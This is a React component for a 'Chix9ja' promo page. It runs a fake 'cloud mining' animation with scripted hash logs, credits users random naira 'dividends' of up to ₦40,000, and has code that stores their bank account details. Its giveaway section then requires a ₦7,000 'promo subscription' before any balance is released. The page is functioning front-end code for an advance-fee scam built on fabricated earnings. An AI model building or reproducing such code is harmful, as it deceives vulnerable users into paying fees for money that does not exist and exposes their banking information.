import React, { useState, useEffect } from 'react';
import { Icons } from './Icons';
import { User, Transaction } from '../types';
import { db, useGiveawayStatus, sanitizeForFirestore } from '../firebase';
import { doc, setDoc, collection, addDoc, getDoc } from 'firebase/firestore';
import { motion, AnimatePresence } from 'motion/react';

interface PromoPageProps {
  user: User;
  onUpdateUser: (updated: User) => void;
  onBack: () => void;
  onGoToSubscribe?: () => void;
}

const PromoPage: React.FC<PromoPageProps> = ({ user, onUpdateUser, onBack, onGoToSubscribe }) => {
  const [miningState, setMiningState] = useState<'idle' | 'mining' | 'success'>('idle');
  const [mineReward, setMineReward] = useState<number>(0);
  const [countdownText, setCountdownText] = useState<string>('');
  const [miningProgress, setMiningProgress] = useState(0);
  const [miningLogs, setMiningLogs] = useState<string[]>([]);
  const [acceptedOffer, setAcceptedOffer] = useState(false);
  
  // Giveaway Form Settings
  const { unlocked: giveawayUnlocked, loading: giveawayLoading } = useGiveawayStatus();
  const [bankName, setBankName] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [accountName, setAccountName] = useState('');
  const [giveawayStatus, setGiveawayStatus] = useState<'idle' | 'submitting' | 'success' | 'error' | 'already_submitted'>('idle');
  const [statusMessage, setStatusMessage] = useState('');

  // 1. Manage mining cooldown
  const cooldownDuration = 5 * 60 * 60 * 1000; // 5 hours in milliseconds
  const lastMined = (user as any).lastMinedTimestamp || 0;
  const nextMineEligible = lastMined + cooldownDuration;
  const isEligibleToMine = Date.now() >= nextMineEligible;

  useEffect(() => {
    if (isEligibleToMine) {
      setCountdownText('');
      return;
    }

    const interval = setInterval(() => {
      const now = Date.now();
      const diff = nextMineEligible - now;
      if (diff <= 0) {
        setCountdownText('');
        clearInterval(interval);
      } else {
        const hours = Math.floor(diff / (3600 * 1000));
        const minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000));
        const seconds = Math.floor((diff % (60 * 1000)) / 1000);
        setCountdownText(
          `${hours.toString().padStart(2, '0')}:${minutes
            .toString()
            .padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`
        );
      }
    }, 1000);

    return () => clearInterval(interval);
  }, [isEligibleToMine, nextMineEligible]);

  // 2. Run simulation when mining starts
  const handleStartMining = () => {
    if (!isEligibleToMine) return;
    setMiningState('mining');
    setMiningProgress(0);
    setMiningLogs(['Establishing secure tunnel to Promo Node...', 'Initializing Cloud Hash Rate: 1.84 TH/s']);

    const logMessages = [
      'Mining blocks inside block_x9ja_049...',
      'Solving cryptographical algorithms...',
      'Allocating high-yield promo dividends...',
      'Securing transaction ledger key...',
      'Finalizing balance reward block...',
    ];

    let currentStep = 0;
    let progressVal = 0;
    const progressInterval = setInterval(() => {
      progressVal += 2;
      setMiningProgress(progressVal);
      
      // Add periodic logs
      if (progressVal % 20 === 0 && currentStep < logMessages.length) {
        setMiningLogs((prevLogs) => [...prevLogs, logMessages[currentStep]]);
        currentStep++;
      }

      if (progressVal >= 100) {
        clearInterval(progressInterval);
        finishMining();
      }
    }, 100);
  };

  const finishMining = async () => {
    // Generate reward amount up to 40,000 NGN
    const rewardAmount = Math.floor(Math.random() * (40000 - 15000 + 1)) + 15000;
    setMineReward(rewardAmount);

    const now = Date.now();
    const newTx: Transaction = {
      id: 'tx_mine_' + Math.random().toString(36).substring(2, 9),
      type: 'credit',
      amount: rewardAmount,
      description: 'Cloud Promo Mining Dividend Reward',
      date: new Date().toISOString(),
      status: 'success',
    };

    const updatedUser: User = {
      ...user,
      balance: (user.balance || 0) + rewardAmount,
      transactions: [newTx, ...(user.transactions || [])],
    };
    (updatedUser as any).lastMinedTimestamp = now;

    // Update in parent state (which handles writing to storage / firebase)
    onUpdateUser(updatedUser);
    setMiningState('success');
  };

  // 3. Submit giveaway details
  const handleSubmitGiveaway = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!bankName.trim() || !accountNumber.trim() || !accountName.trim()) {
      setStatusMessage('Please fill all banking fields.');
      setGiveawayStatus('error');
      return;
    }
    if (accountNumber.trim().length < 10) {
      setStatusMessage('Please enter a valid 10-digit account number.');
      setGiveawayStatus('error');
      return;
    }

    setGiveawayStatus('submitting');
    try {
      const gvRef = doc(db, 'giveaways', user.email.toLowerCase().trim());
      await setDoc(gvRef, {
        email: user.email,
        name: user.name,
        bankName: bankName.trim(),
        accountNumber: accountNumber.trim(),
        accountName: accountName.trim(),
        date: new Date().toISOString(),
        status: 'pending',
      });

      setGiveawayStatus('success');
      setStatusMessage('Giveaway request successfully lodged! Please wait for management approval.');
      setBankName('');
      setAccountNumber('');
      setAccountName('');
    } catch (err) {
      console.error(err);
      setStatusMessage('Failed to submit. Please try again.');
      setGiveawayStatus('error');
    }
  };

  return (
    <div className="min-h-screen bg-black text-white relative pb-28">
      {/* Premium Gradient Header */}
      <div className="bg-gradient-to-b from-gray-950 to-black border-b border-gray-900/50 px-4 py-4 sticky top-0 z-50 backdrop-blur-md bg-opacity-95">
        <div className="flex items-center justify-between">
          <button 
            onClick={onBack}
            className="w-10 h-10 rounded-full bg-white/5 flex items-center justify-center text-gray-400 hover:text-white transition-colors"
          >
            <Icons.ChevronRight className="rotate-180" size={20} />
          </button>
          <div className="text-center">
            <p className="text-[9px] text-green-glow font-black uppercase tracking-widest leading-none">Chix9ja Promos</p>
            <h3 className="text-base font-black text-white uppercase tracking-tight mt-1">PROMO & FREE MINING</h3>
          </div>
          <div className="w-10 h-10 rounded-full bg-green-glow/5 border border-green-glow/20 flex items-center justify-center text-green-glow">
            <Icons.Zap size={18} className="animate-pulse" />
          </div>
        </div>
      </div>

      <div className="px-5 py-6 space-y-6">
        {/* Banner Card */}
        <div className="relative overflow-hidden rounded-2xl bg-gradient-to-r from-green-500/10 via-emerald-500/5 to-transparent border border-green-glow/20 p-5 space-y-2">
          <p className="text-[10px] text-green-glow font-black uppercase tracking-wider">Cloud Multiplier active</p>
          <h2 className="text-xl font-black uppercase tracking-tight">Earning Playground</h2>
          <p className="text-xs text-gray-400 leading-relaxed font-bold">
            Mine free dividends every 5 hours and join hourly community cash giveaways verified instantly to your balance!
          </p>
        </div>

        {/* 1. MINING SECTION */}
        <div className="bg-gray-900/50 border border-gray-800 rounded-2xl p-5 space-y-4 relative overflow-hidden">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-2">
              <div className="w-8 h-8 rounded-xl bg-green-glow/10 flex items-center justify-center text-green-glow">
                <Icons.Sync className={miningState === 'mining' ? 'animate-spin' : ''} size={16} />
              </div>
              <div>
                <h3 className="text-sm font-black text-white uppercase tracking-wider">Cloud Dividend Miner</h3>
                <p className="text-[9px] text-gray-500 font-bold uppercase tracking-widest mt-0.5">Yield cap: ₦40,000</p>
              </div>
            </div>
            
            {countdownText && (
              <div className="bg-red-500/10 border border-red-500/20 px-3 py-1 rounded-full text-red-400 font-mono text-[10px] font-black tracking-widest uppercase">
                COOLDOWN: {countdownText}
              </div>
            )}
          </div>

          <AnimatePresence mode="wait">
            {miningState === 'idle' && (
              <motion.div 
                key="idle"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="space-y-4"
              >
                <div className="bg-black/40 p-4 rounded-xl border border-gray-800/40 text-center space-y-1">
                  <p className="text-xs text-gray-300 font-medium leading-relaxed">
                    Tap the button below to initiate high-speed node verification hash lines and mine your random cloud cash bounty.
                  </p>
                </div>
                <button
                  disabled={!!countdownText}
                  onClick={handleStartMining}
                  className={`w-full py-4 rounded-xl font-black text-xs uppercase tracking-widest transition-all ${
                    countdownText 
                      ? 'bg-zinc-800 text-zinc-500 border border-zinc-700/50 cursor-not-allowed' 
                      : 'bg-green-glow text-black font-extrabold shadow-[0_0_20px_rgba(46,213,115,0.25)] hover:shadow-green-glow/40 active:scale-95'
                  }`}
                >
                  {countdownText ? 'Miner Recharging...' : 'Start Cloud Mining'}
                </button>
              </motion.div>
            )}

            {miningState === 'mining' && (
              <motion.div 
                key="mining"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="space-y-4"
              >
                {/* Progress Bar */}
                <div className="space-y-1.5">
                  <div className="flex justify-between text-[10px] text-gray-400 font-bold uppercase tracking-wider">
                    <span>Synchronizing Blocks...</span>
                    <span>{miningProgress}%</span>
                  </div>
                  <div className="w-full bg-zinc-800 h-2 rounded-full overflow-hidden">
                    <div 
                      className="bg-green-glow h-full transition-all duration-100 ease-out" 
                      style={{ width: `${miningProgress}%` }}
                    />
                  </div>
                </div>

                {/* Simulated Log Output */}
                <div className="bg-black border border-gray-800 rounded-xl p-3 h-28 overflow-y-auto font-mono text-[9px] text-green-glow/70 space-y-1">
                  {miningLogs.map((log, index) => (
                    <div key={index} className="leading-relaxed">
                      <span className="text-green-glow">&gt;</span> {log}
                    </div>
                  ))}
                </div>
              </motion.div>
            )}

            {miningState === 'success' && (
              <motion.div 
                key="success"
                initial={{ scale: 0.9, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                className="text-center p-6 bg-green-glow/5 border border-green-glow/20 rounded-xl space-y-4"
              >
                <div className="mx-auto w-16 h-16 bg-green-glow/15 rounded-full flex items-center justify-center text-green-glow animate-bounce">
                  <Icons.Reward size={32} />
                </div>
                <div className="space-y-1">
                  <h4 className="text-xs font-black text-gray-400 uppercase tracking-widest">Dividend Generated!</h4>
                  <p className="text-3xl font-black text-green-glow tracking-tight">₦{mineReward.toLocaleString()}</p>
                  <p className="text-[10px] text-gray-500 font-bold uppercase mt-1">Successfully Credited to your Main Balance!</p>
                </div>
                <button
                  onClick={() => setMiningState('idle')}
                  className="px-6 py-2.5 bg-white text-black font-extrabold text-[10px] uppercase tracking-wider rounded-xl hover:bg-gray-200 transition-colors"
                >
                  Confirm Dividend
                </button>
              </motion.div>
            )}
          </AnimatePresence>
        </div>


        {/* 2. GIVEAWAY SECTION */}
        <div className="bg-gray-900/50 border border-gray-800 rounded-2xl p-5 space-y-4">
          <div className="flex items-center space-x-2">
            <div className="w-8 h-8 rounded-xl bg-amber-500/10 flex items-center justify-center text-amber-500">
              <Icons.Gift size={16} />
            </div>
            <div>
              <h3 className="text-sm font-black text-white uppercase tracking-wider">Giveaway Request Desk</h3>
              <p className="text-[9px] text-gray-500 font-bold uppercase tracking-widest mt-0.5">Community Aid Programs</p>
            </div>
          </div>

          {giveawayLoading ? (
            <div className="text-center py-6 text-xs text-gray-400 font-bold uppercase">
              Verifying Desk Permissions...
            </div>
          ) : !giveawayUnlocked ? (
            <div className="bg-black/60 border border-red-500/20 p-5 rounded-xl text-center space-y-3">
              <div className="mx-auto w-10 h-10 bg-red-500/10 rounded-full flex items-center justify-center text-red-500">
                <Icons.Lock size={18} />
              </div>
              <div className="space-y-1">
                <h4 className="text-[11px] font-black text-white uppercase tracking-wider">Desk Currently Closed</h4>
                <p className="text-[10px] text-gray-400 leading-normal font-bold">
                  Management hosts random flash giveaways on our official channels. This terminal is currently locked. Live agent review will resume shortly!
                </p>
              </div>
            </div>
          ) : (
            <div className="space-y-4">
              <div className="bg-gradient-to-r from-amber-500/10 via-orange-500/5 to-transparent border border-amber-500/20 p-4 rounded-xl text-left">
                <p className="text-[11px] text-gray-300 leading-relaxed font-bold">
                  🎉 Giveaways are currently <span className="text-amber-400 font-black uppercase">UNLOCKED!</span> Complete the verification terminal to capture your random giveaway cash bounty.
                </p>
              </div>

              {!acceptedOffer ? (
                <div className="space-y-4">
                  <div className="p-4 bg-amber-500/5 border border-amber-500/20 rounded-xl space-y-3 text-center">
                    <p className="text-xs text-gray-400 leading-relaxed font-bold">
                       You have active eligibility for a verified Promo Giveaway cash allotment. Click the button below to accept the immediate offer and receive transfer instructions.
                    </p>
                  </div>
                  <button
                    onClick={() => {
                      setAcceptedOffer(true);
                    }}
                    className="w-full py-4 bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-600 hover:to-orange-600 text-black font-black text-xs uppercase tracking-widest rounded-xl transition-all shadow-[0_0_20px_rgba(241,196,15,0.2)] active:scale-95 flex items-center justify-center space-x-2"
                  >
                    <Icons.Gift size={16} />
                    <span>ACCEPT OFFER / ACCEPT OFERR</span>
                  </button>
                </div>
              ) : (
                <div className="space-y-4">
                  <div className="p-5 bg-zinc-900 border border-amber-500/20 rounded-2xl space-y-4 text-left font-sans">
                    <div className="flex items-center space-x-2 text-amber-400 font-black text-xs uppercase tracking-wider">
                      <Icons.Star size={16} />
                      <span>PROMO DESK INSTRUCTION</span>
                    </div>
                    <div className="text-xs text-zinc-300 space-y-3 font-bold leading-relaxed">
                      <p>
                        To finalize your request, please go to the subscription page and select the <span className="text-amber-400 font-black uppercase">Promo Subscription of 7,000 Naira (₦7000)</span> where you can subscribe for once withdrawal.
                      </p>
                      <p className="text-[10px] text-zinc-500 leading-normal font-medium">
                        Your giveaway reward voucher and associated account balances will be released to your designated banking profile upon one-time settlement activation.
                      </p>
                    </div>
                  </div>
                  
                  {onGoToSubscribe && (
                    <button
                      onClick={onGoToSubscribe}
                      className="w-full py-3.5 bg-green-glow text-black font-extrabold text-xs uppercase tracking-widest rounded-xl transition-all hover:bg-emerald-400 active:scale-95 flex items-center justify-center space-x-2"
                    >
                      <span>Go to Subscription Page</span>
                      <Icons.ChevronRight size={14} />
                    </button>
                  )}
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default PromoPage;
